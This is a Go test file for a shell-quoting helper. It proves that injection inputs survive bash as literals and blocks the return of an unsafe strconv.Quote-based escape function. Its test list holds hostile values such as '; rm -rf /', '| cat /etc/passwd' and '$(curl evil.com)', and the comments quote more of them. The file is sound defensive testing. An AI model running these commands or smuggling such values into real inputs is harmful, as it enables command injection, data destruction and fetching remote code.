package security

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// TestShellQuoteSuppressesExpansion is the primitive #660 needed and the repo
// did not have: ShellEscape claimed to be shell-safe and was not.
func TestShellQuoteSuppressesExpansion(t *testing.T) {
	cases := map[string]string{
		"/efs":  `'/efs'`,
		"$HOME": `'$HOME'`,
		"$(id)": `'$(id)'`,
		"a b":   `'a b'`,
		`it's`:  `'it'\''s'`,
		`"dq"`:  `'"dq"'`,
		"":      `''`,
	}
	for in, want := range cases {
		if got := ShellQuote(in); got != want {
			t.Errorf("ShellQuote(%q) = %s, want %s", in, got, want)
		}
	}
}

// attackPatterns is the list the deleted TestShellEscapeAttackPatterns used.
//
// Kept deliberately. That test fed these into ShellEscape and asserted only that
// the result STARTED WITH A DOUBLE QUOTE — the very property that made it
// unsafe, since a POSIX shell expands $(...) and backticks inside double quotes.
// A test named for attack patterns was certifying the hole, and passing. The
// same inputs are now run through a real shell to prove they survive as
// literals.
var attackPatterns = []string{
	"; rm -rf /",
	"$(whoami)",
	"`whoami`",
	"../../etc/passwd",
	"${IFS}malicious",
	"| cat /etc/passwd",
	"& malicious &",
	"> /dev/null",
	"|| malicious",
	"&& malicious",
	"test;malicious",
	"$(curl evil.com)",
	"`curl evil.com`",
	"test${IFS}command",
	`a'b"c`,
	"$HOME",
	"a b c",
}

// TestShellQuoteSurvivesARealShell is the assertion the old test only gestured
// at: run `echo <quoted>` through bash and require the output to equal the input
// byte for byte. Nothing expands, nothing executes, nothing is lost.
//
// Checking the STRING SHAPE is what let the previous version pass while the
// behaviour was wrong. Checking the shell's behaviour cannot.
func TestShellQuoteSurvivesARealShell(t *testing.T) {
	if _, err := exec.LookPath("bash"); err != nil {
		t.Skip("bash not available")
	}
	for _, p := range attackPatterns {
		t.Run(p, func(t *testing.T) {
			// nosemgrep: go.lang.security.audit.dangerous-exec-command.dangerous-exec-command
			cmd := exec.Command("bash", "-c", "printf '%s' "+ShellQuote(p))
			cmd.Env = []string{"PATH=/usr/bin:/bin", "HOME=/should-not-appear", "IFS= "}
			out, err := cmd.Output()
			if err != nil {
				t.Fatalf("bash rejected the quoted value: %v", err)
			}
			if string(out) != p {
				t.Errorf("value changed passing through a shell:\n  in:  %q\n  out: %q\n\n"+
					"Something expanded or was dropped — the whole point of quoting is that "+
					"this round-trips.", p, string(out))
			}
			if strings.Contains(string(out), "/should-not-appear") {
				t.Error("$HOME expanded inside the quoting")
			}
		})
	}
}

// TestNoShellEscapeHelperReturns is the gate for spawn#680.
//
// ShellEscape is deleted, not deprecated, and the reason is the NAME. It was the
// obvious thing to reach for — "the escape function" — and it was the unsafe
// one: strconv.Quote, i.e. Go/C escaping inside DOUBLE quotes, where a POSIX
// shell still expands $VAR, $(...) and backticks. Leaving a deprecated footgun
// with the better name than the safe function keeps the trap baited.
//
// What makes this worth a gate rather than a comment: there was a PASSING test
// called TestShellEscapeAttackPatterns which fed in "$(whoami)" and
// "`curl evil.com`" and asserted only that the result started with a double
// quote — the exact property that made it unsafe. A test named for attack
// patterns was certifying the hole. So the failure mode here is not "someone
// writes unsafe code", it is "someone writes unsafe code and a reassuringly
// named test agrees with them".
func TestNoShellEscapeHelperReturns(t *testing.T) {
	files, err := filepath.Glob("*.go")
	if err != nil {
		t.Fatal(err)
	}
	if len(files) == 0 {
		t.Fatal("globbed no files; the gate would pass vacuously")
	}

	checked := 0
	for _, f := range files {
		// Production code only. This gate's own error messages quote the strings it
		// searches for, so scanning tests makes it flag itself — which it did on
		// the first run.
		if strings.HasSuffix(f, "_test.go") {
			continue
		}
		checked++
		b, err := os.ReadFile(f)
		if err != nil {
			t.Fatalf("read %s: %v", f, err)
		}
		src := string(b)

		if strings.Contains(src, "func ShellEscape(") {
			t.Errorf("%s reintroduces ShellEscape. It was strconv.Quote and therefore not "+
				"shell-safe; use ShellQuote, or deliver untrusted text as a file rather "+
				"than interpolating it (#680).", f)
		}

		// strconv.Quote in this package, in any form, is the same mistake wearing
		// a different name.
		for i, line := range strings.Split(src, "\n") {
			if strings.HasPrefix(strings.TrimSpace(line), "//") {
				continue
			}
			if strings.Contains(line, "strconv.Quote") {
				t.Errorf("%s:%d uses strconv.Quote:\n    %s\n\nThat is Go/C escaping inside "+
					"DOUBLE quotes — $VAR, $(...) and backticks all still expand. If the "+
					"intent is shell quoting, use ShellQuote.", f, i+1, strings.TrimSpace(line))
			}
		}
	}

	if checked == 0 {
		t.Fatal("scanned no non-test files; the gate would pass vacuously")
	}
}
